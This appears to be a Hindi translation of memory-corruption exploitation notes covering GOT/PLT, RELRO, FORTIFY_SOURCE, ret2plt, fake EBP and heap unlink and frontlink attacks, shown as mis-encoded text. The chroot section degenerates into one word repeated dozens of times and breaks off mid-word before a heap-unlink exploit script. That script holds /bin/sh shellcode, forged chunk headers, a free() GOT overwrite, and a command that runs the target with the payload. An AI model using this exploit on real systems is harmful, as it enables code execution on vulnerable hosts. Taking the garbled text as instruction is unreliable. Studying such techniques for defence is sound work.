рдЬрдм рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ PLT рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд░рдЦрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдлреНрд▓реЛ рдХреЛ рд╡рд╣рд╛рдБ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдкрд╣рд▓реА рдмрд╛рд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ GOT рдореЗрдВ рдХреНрдпрд╛ рд╣реИ, рд╡рд╣ PLT рдХрд╛ рдЕрдЧрд▓рд╛ рдирд┐рд░реНрджреЗрд╢ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдлреНрд▓реЛ PLT рдХреЗ рдХреЛрдб (rtfd) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рдЙрд╕реЗ GOT рдореЗрдВ рд╕рд╣реЗрдЬрддрд╛ рд╣реИ рдФрд░ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред

рдЬрдм рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдХрдВрдкрд╛рдЗрд▓рд░ рдиреЗ рдмрддрд╛рдпрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕ рдСрдлрд╕реЗрдЯ рдкрд░ рдбреЗрдЯрд╛ рд╕реНрдерд┐рдд рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Lazy binding тАФ> рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкрд╣рд▓реА рдмрд╛рд░ рдЬрдм рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЧреЛрдЯ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рддрд╛рдХрд┐ рдЬрдм рдЦреЛрдЬ рдХреА рдЬрд╛рдП, рддреЛ рд╡рд╣рд╛рдБ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдП рдФрд░ рдлрд┐рд░ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рди рд╣реЛред

Bind now тАФ> рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЛрдб рд╣реЛрддреЗ рд╕рдордп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдЦреЛрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ .got, .dtors, .ctors, .dynamic, .jcr рдЬреИрд╕реА рдЦрдВрдбреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **-z relro** рдФрд░ **-z now**

рдЗрд╕рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЬрдЯрд┐рд▓ рдирд╣реАрдВ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпреЗ рд╣рдорд▓реЗ рдЕрдм рднреА рд╕рдВрднрд╡ рд╣реИрдВред

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** тАФ> рдпрд╣ рдкрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ BIND NOW рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ

**Fortify Source -D\_FORTIFY\_SOURCE=1 рдпрд╛ =2**

рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╕реЗ рдбреЗрдЯрд╛ рдХреЙрдкреА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:\
char buf\[16];\
strcpy(but, source);

рдпрд╣ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ strcpy() рдХреЛ \_\_strcpy\_chk() рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдмрдлрд╝рд░ рдХрд╛ рдЖрдХрд╛рд░ рдЕрдзрд┐рдХрддрдо рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**=1** рдпрд╛ **=2** рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рд╣реИ рдХрд┐:

рджреВрд╕рд░рд╛ рдпрд╣ рдирд╣реАрдВ рджреЗрддрд╛ рдХрд┐ **%n** рд▓реЗрдЦрди рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдЦрдВрдб рд╕реЗ рдЖрддрд╛ рд╣реИред рд╕рд╛рде рд╣реА, рддрд╛рддреНрдХрд╛рд▓рд┐рдХ рддрд░реАрдХреЗ рд╕реЗ рдкрд╣реБрдВрдЪ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ рдЙрдкрд░реЛрдХреНрдд рдХрд┐рдП рдЧрдП рд╣реЛрдВ рддреЛ рд╣реА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛рдиреА рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **%3$d** рдЕрдЧрд░ рдкрд╣рд▓реЗ **%2$d** рдФрд░ **%1$d** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП argv\[0\] рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЗрд╕рдореЗрдВ рджреВрд╕рд░реА рдЬрдЧрд╣ рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдПрдХ рдЧреНрд▓реЛрдмрд▓ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рдкрддреЗ рдореЗрдВ) рддреЛ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред рдкреГрд╖реНрда 191

**Libsafe рдХреА рдЕрджреНрдпрддрди**

рдЗрд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: LD\_PRELOAD=/lib/libsafe.so.2\
рдпрд╛\
тАЬ/lib/libsave.so.2тАЭ > /etc/ld.so.preload

рдХреБрдЫ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рд╕реЗ рдЕрдВрддрд░реНрдЧрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдорд╛рдирдХреАрдХреГрдд рдирд╣реАрдВ рд╣реИред (рдХреЗрд╡рд▓ x86 рдХреЗ рд▓рд┐рдП, -fomit-frame-pointer рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рд╕реНрдЯреЗрдЯрд┐рдХ рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рд╕рднреА рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ LD\_PRELOAD suid рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ)ред

**ASCII Armored Address Space**

рдпрд╣ 0x00000000 рд╕реЗ 0x00ffffff рддрдХ рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдореЗрд╢рд╛ 0x00 рдПрдХ рдмрд╛рдЗрдЯ рд╣реЛред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╣рдорд▓реЗ рдХреЛ рд▓рдЧрднрдЧ рд░реЛрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдФрд░ рдЫреЛрдЯреЗ рдЗрдВрдбрд┐рдпрди рдореЗрдВ рдХрдо рд╣реЛрддрд╛ рд╣реИред

**ret2plt**

рдЗрд╕рдореЗрдВ рдПрдХ ROP рдХрд╛ рдХрд╛рдо рдХрд░рдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ plt рд╕реЗ strcpy@plt рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ GOT рдХреЗ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд░рдирд╛ рд╣реИ (system())ред рдЗрд╕рдХреЗ рдмрд╛рдж рдпрд╣реА рдХрд╛рдо GOT+1 рдХреА рдУрд░ рднреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ system() рдХрд╛ 2рд╡рд╛рдВ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ... рдЕрдВрдд рдореЗрдВ GOT рдореЗрдВ рд╕рд╣реЗрдЬреА рдЧрдИ рдкрддрд╛ рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ system() рд╣реЛрдЧрд╛ред

**рдлреЗрдХ EBP**

рдЬрд┐рди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ EBP рдХреЛ рддрд░реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдЬрд┐рд╕реНрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ EIP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ system() рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЙрд╕ рд╕рдордп EBP рдХреЛ рднреА рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рдРрд╕реЗ рд╕реНрдерд╛рди рдХреА рдУрд░ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░реЗ рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рднреА 2 рдмрд╛рдЗрдЯ рдХрд╛ рд╡рд┐рдЪрд╛рд░ рд╣реЛ рдФрд░ рдлрд┐рд░ &тАЭ/bin/shтАЭ рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПред

**chroot() рдХреЗ рд╕рд╛рде рдЬреЗрд▓реНрд╕**

debootstrap -arch=i386 hardy /home/user тАФ> рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдд рдЙрдкрдирд┐рд░
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<IтАЭ, 0xfffffff0) #рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдореБрдХреНрдд рд╣реЛрдиреЗ рдХрд╛ рдмрд┐рдЯ 1 рд╣реЛ**

**fake\_size = pack("\<IтАЭ, 0xfffffffc) #-4, рддрд╛рдХрд┐ 3 рд╡реЗрдВ рдЯреБрдХрдбрд╝реЗ рдХрд╛ "рд╕рд╛рдЗрдЬрд╝" 4 рдмрд╛рдЗрдЯ рдкреАрдЫреЗ рд╣реИ (рдкрд┐рдЫрд▓реЗ_рд╕рд╛рдЗрдЬрд╝ рдХреА рдУрд░ рджреЗрдЦрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ 2 рд╡реЗрдВ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реИ)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #рдкреЗрд▓реЛрдб рдореЗрдВ рдкрд╣рд▓реЗ 8 рдмрд╛рдЗрдЯ рднрд░рд╛рдИ рдЬрд╛рдПрдВрдЧреА**

**got\_free = pack("\<I", 0x08048300 - 12) #free() рдХрд╛ рдкрддрд╛ plt-12 (рдпрд╣ рдкрддрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ free рдХреЛ рджреВрд╕рд░реА рдмрд╛рд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдП рдЬрдм shellcode рдЪрд▓рд╛рдИ рдЬрд╛рдП)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #рдЬреИрд╕рд╛ рдХрд┐ рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛, рдкреЗрд▓реЛрдб 8 рдмрд╛рдЗрдЯ рднрд░рд╛рдИ рдЬрд╛рддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2 рд╡реЗрдВ рдЯреБрдХрдбрд╝реЗ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, got\_free рдЙрд╕ рдЬрдЧрд╣ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рдо рдПрдбреНрд░реЗрд╕ addr\_sc + 12 рдХреЛ рд╕рд╣реЗрдЬреЗрдВрдЧреЗ**

**os.system("./8.3.o " + payload)**

**unset() рдЙрд▓рдЯреА рджрд┐рд╢рд╛ рдореЗрдВ рдореБрдХреНрдд рдХрд░рддреЗ рд╣реБрдП (wargame)**

рд╣рдо 3 рд▓рдЧрд╛рддрд╛рд░ рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрд╕реА рдХреНрд░рдо рдореЗрдВ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ:

рдЪрдВрдХ c рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЪрдВрдХ a рдХрд╛ рдЙрдкрдпреЛрдЧ b рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдХрд╛рд░ рдореЗрдВ рдкрд┐рдЫрд▓реЗ_рдЗрдиреНрдпреВрдЬрд╝ рдмрд┐рдЯ рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реЛ рдЬрд╛рдП рдФрд░ рдЪрдВрдХ a рдореБрдХреНрдд рд╣реИ рдпрд╣ рд╕реЛрдЪреЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╣реЗрдбрд░ b рдореЗрдВ рдЖрдХрд╛рд░ рдХреЛ -4 рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдкреНрд░реЛрдЧреНрд░рд╛рдо "a" рдХреЛ рдореБрдХреНрдд рдорд╛рдиреЗрдЧрд╛ рдФрд░ рдПрдХ рдмрд┐рди рдореЗрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╡рд╣ unlink() рдХреЛ рдмреБрд▓рд╛рдПрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреНрдпреЛрдВрдХрд┐ рд╣реЗрдбрд░ PREV_SIZE -4 рд╣реИред рд╡рд╣ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ "a" рдХрд╛ рдЯреБрдХрдбрд╝рд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ b+4 рдореЗрдВ рд╢реБрд░реВ рд╣реЛ рд░рд╣рд╛ рд╣реИред рдЕрд░реНрдерд╛рдд, рд╡рд╣ b+4 рдореЗрдВ рдПрдХ unlink() рдХрд░реЗрдЧрд╛, рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП b+12 рдкрд░ рдкреЙрдЗрдВрдЯрд░ "fd" рд╣реЛрдЧрд╛ рдФрд░ b+16 рдкрд░ рдкреЙрдЗрдВрдЯрд░ "bk" рд╣реЛрдЧрд╛ред

рдЗрд╕ рддрд░рд╣, рдпрджрд┐ рд╣рдо bk рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рдФрд░ fd рдореЗрдВ "puts()" рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ -12 рдбрд╛рд▓рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд╛рд░рд╛ рдкреЗрд▓реЛрдб рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

**рдлреНрд░рдВрдЯрд▓рд┐рдВрдХ рддрдХрдиреАрдХ**

рдЬрдм рдХреБрдЫ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдХреЛрдИ рднреА рд╕рдВрдЧрдд рдЯреБрдХрдбрд╝реЗ рдореБрдХреНрдд рдирд╣реАрдВ рд╣реИрдВ, рддреЛ unlink() рдХреЛ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рд╕реАрдзреЗ frontlink() рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЙрд╕ рд╡рдВрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдЬрдм рдЙрд╕ malloc рдХреЛ рд╣рдорд▓рд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (free())ред

рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

рдПрдХ рдмрдлрд╝рд░ рдЬрд┐рд╕реЗ рдбреЗрдЯрд╛ рдХреЗ рдЗрдирдкреБрдЯ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ

рдЗрд╕рдХреЗ рд╕рдВрдЧрдд рдПрдХ рдмрдлрд╝рд░ рдЬрд┐рд╕реЗ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЬрд┐рд╕рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рдлрд╝реАрд▓реНрдб fd рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдкрд╣рд▓реЗ рдмрдлрд╝рд░ рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд

рдПрдХ рдмрдлрд╝рд░ рдЬрд┐рд╕реЗ 512 рд╕реЗ рдЕрдзрд┐рдХ рд▓реЗрдХрд┐рди рдкрд┐рдЫрд▓реЗ рдмрдлрд╝рд░ рд╕реЗ рдХрдо рдЖрдХрд╛рд░ рдореЗрдВ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП

